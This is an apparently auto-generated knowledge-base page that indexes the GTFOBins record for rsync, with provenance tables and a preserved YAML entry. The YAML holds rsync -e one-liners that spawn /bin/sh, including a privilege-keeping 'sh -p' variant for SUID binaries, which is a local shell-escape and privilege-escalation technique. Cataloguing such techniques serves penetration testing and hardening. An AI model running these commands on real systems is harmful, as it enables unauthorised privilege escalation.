---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rsync

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rsync` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsync` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rsync](../../tools/linux/rsync.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rsync |
| name | rsync |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rsync/ |

## Preserved Source Material

```yaml
_body: ''
_name: rsync
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsync
functions:
  shell:
  - code: rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
    contexts:
      sudo: null
      suid:
        code: rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
        shell: false
      unprivileged: null
```
